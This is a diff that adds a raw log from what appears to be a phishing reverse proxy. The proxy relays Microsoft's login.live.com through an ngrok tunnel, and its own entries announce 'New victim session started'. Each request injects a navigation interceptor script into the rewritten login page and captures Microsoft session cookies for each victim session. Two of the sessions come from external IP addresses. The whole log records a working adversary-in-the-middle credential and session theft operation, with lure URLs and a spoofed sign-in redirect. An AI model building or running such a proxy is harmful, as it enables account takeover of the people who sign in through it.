@@ -1,0 +1,120 @@
+[2026-07-24T16:37:57.395Z] [SYSTEM] Proxy server initializing | {"logFile":"C:\\Users\\palmo\\Documents\\TOOLS\\New pROJECT\\PDF360\\Proxy\\logs\\proxy-2026-07-24T16-37-57-395Z.log","responseCaptureDir":"C:\\Users\\palmo\\Documents\\TOOLS\\New pROJECT\\PDF360\\Proxy\\logs\\responses"}
+[2026-07-24T16:38:09.768Z] [ENDPOINT_PERSONAL] Personal endpoint accessed | {"url":"/p?test=1","clientIP":"::ffff:127.0.0.1","fromHost":"127.0.0.1:3001"}
+[2026-07-24T16:38:09.768Z] [ENDPOINT_PERSONAL_REDIRECT] Redirecting to personal login endpoint | {"fromURL":"/p?test=1","toURL":"/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F","clientIP":"::ffff:127.0.0.1"}
+[2026-07-24T16:52:04.013Z] [ENDPOINT_PERSONAL] Personal endpoint accessed | {"url":"/p?Amethyst=Sachiel1&Chamuel=Azrael1","clientIP":"170.75.255.78","fromHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T16:52:04.014Z] [ENDPOINT_PERSONAL_REDIRECT] Redirecting to personal login endpoint | {"fromURL":"/p?Amethyst=Sachiel1&Chamuel=Azrael1","toURL":"/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F","clientIP":"170.75.255.78"}
+[2026-07-24T16:52:04.579Z] [SESSION_CREATED] New victim session started | {"session":"5Jd9Nc9rvbh1","targetHost":"login.live.com","hostname":"login.live.com","protocol":"https:","isPersonal":true}
+[2026-07-24T16:52:07.217Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/?Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T16:52:07.218Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/?Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T16:52:08.529Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/?Amethyst=Sachiel1&Chamuel=Azrael2","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12883"}
+[2026-07-24T16:52:08.531Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":5,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T16:52:08.532Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T16:52:08.533Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12883,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T16:52:08.533Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T16:52:08.533Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T16:52:08.534Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T16:52:08.534Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26532,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T16:52:08.537Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26532","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:32:47.448Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:32:48.288Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:32:50.347Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12878"}
+[2026-07-24T18:32:50.348Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:32:50.348Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:50.349Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12878,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:50.349Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:50.349Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:50.359Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:32:50.360Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26757,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:50.360Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26757","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:32:52.540Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:32:53.352Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:32:53.839Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12870"}
+[2026-07-24T18:32:53.840Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:32:53.840Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:53.840Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12870,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:53.841Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:53.841Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:53.841Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:32:53.842Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26668,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:32:53.842Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26668","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:33:01.800Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:33:02.495Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:33:03.597Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12875"}
+[2026-07-24T18:33:03.598Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:33:03.599Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:03.599Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12875,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:03.599Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:03.600Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:03.600Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:33:03.600Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26508,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:03.601Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26508","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:33:37.244Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:33:40.906Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:33:42.304Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12880"}
+[2026-07-24T18:33:42.305Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:33:42.306Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:42.306Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12880,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:42.306Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:42.307Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:42.307Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:33:42.307Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26671,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:33:42.308Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26671","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:34:47.124Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:34:47.822Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:34:48.863Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12879"}
+[2026-07-24T18:34:48.864Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:34:48.865Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:34:48.866Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12879,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:34:48.867Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:34:48.868Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:34:48.868Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:34:48.869Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26554,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:34:48.872Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26554","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:35:32.609Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:41.145Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:41.658Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:37:43.136Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12880"}
+[2026-07-24T18:37:43.137Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":5,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:43.138Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:43.138Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12880,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:43.138Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:43.138Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:43.139Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:37:43.139Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26450,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:43.139Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26450","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:37:45.043Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:45.550Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:37:47.212Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12879"}
+[2026-07-24T18:37:47.212Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:47.213Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:47.213Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12879,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:47.213Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:47.214Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:47.214Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:37:47.215Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26626,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:47.215Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26626","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:37:53.013Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"5Jd9Nc9rvbh1","url":"https://labrador-mutate-pampered.ngrok-free.dev/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F&Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:53.519Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/","method":"GET","bodyLength":0,"session":"5Jd9Nc9rvbh1","isNavigationRequest":false}
+[2026-07-24T18:37:54.556Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12873"}
+[2026-07-24T18:37:54.557Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"5Jd9Nc9rvbh1","cookieCount":4,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:37:54.559Z] [END_HANDLER_CALLED] Response end handler started | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:54.560Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12873,"isHTML":true,"hasBody":true,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:54.560Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:54.561Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:54.562Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"5Jd9Nc9rvbh1","scriptType":"at-start"}
+[2026-07-24T18:37:54.563Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26740,"session":"5Jd9Nc9rvbh1"}
+[2026-07-24T18:37:54.565Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26740","hasLocation":false,"location":"NONE"}
+[2026-07-24T18:38:33.795Z] [ENDPOINT_PERSONAL] Personal endpoint accessed | {"url":"/p?Amethyst=Sachiel1&Chamuel=Azrael1","clientIP":"170.75.255.26","fromHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:38:33.796Z] [ENDPOINT_PERSONAL_REDIRECT] Redirecting to personal login endpoint | {"fromURL":"/p?Amethyst=Sachiel1&Chamuel=Azrael1","toURL":"/login?method=signin&mode=secure&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F","clientIP":"170.75.255.26"}
+[2026-07-24T18:38:34.580Z] [SESSION_CREATED] New victim session started | {"session":"F2x9Wgigtj97","targetHost":"login.live.com","hostname":"login.live.com","protocol":"https:","isPersonal":true}
+[2026-07-24T18:38:36.260Z] [SERVICE_WORKER_REQUEST] Request from service worker | {"session":"F2x9Wgigtj97","url":"https://labrador-mutate-pampered.ngrok-free.dev/?Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","fromHostname":"labrador-mutate-pampered.ngrok-free.dev","toHost":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:38:36.261Z] [PROXY_REQUEST] Making request to Microsoft | {"protocol":"https:","hostname":"login.live.com","path":"/?Amethyst=Sachiel1&Chamuel=Azrael2","method":"GET","bodyLength":0,"session":"F2x9Wgigtj97","isNavigationRequest":false}
+[2026-07-24T18:38:37.888Z] [RESPONSE] Response received from Microsoft | {"status":200,"url":"https://login.live.com/?Amethyst=Sachiel1&Chamuel=Azrael2","location":"NONE","contentType":"text/html; charset=utf-8","contentLength":"12886"}
+[2026-07-24T18:38:37.889Z] [COOKIE_CAPTURE] Capturing cookies from response | {"session":"F2x9Wgigtj97","cookieCount":5,"fromHostname":"login.live.com","toProxy":"labrador-mutate-pampered.ngrok-free.dev"}
+[2026-07-24T18:38:37.890Z] [END_HANDLER_CALLED] Response end handler started | {"session":"F2x9Wgigtj97"}
+[2026-07-24T18:38:37.890Z] [HTML_CHECK] Checking if response is HTML | {"contentType":"text/html; charset=utf-8","bodyLength":12886,"isHTML":true,"hasBody":true,"session":"F2x9Wgigtj97"}
+[2026-07-24T18:38:37.890Z] [HTML_PROCESS_START] Starting HTML rewriting process | {"session":"F2x9Wgigtj97"}
+[2026-07-24T18:38:37.891Z] [HTML_URL_SCAN] URLs found in HTML response | {"totalMatches":0,"uniqueUrls":[],"session":"F2x9Wgigtj97"}
+[2026-07-24T18:38:37.891Z] [SCRIPT_INJECTED] Navigation interceptor injected at start | {"session":"F2x9Wgigtj97","scriptType":"at-start"}
+[2026-07-24T18:38:37.891Z] [HTML_PROCESS_COMPLETE] HTML rewriting finished | {"modified":true,"newBodyLength":26815,"session":"F2x9Wgigtj97"}
+[2026-07-24T18:38:37.892Z] [CLIENT_RESPONSE] Sending response to client | {"status":200,"contentType":"text/html; charset=utf-8","contentLength":"26815","hasLocation":false,"location":"NONE"}
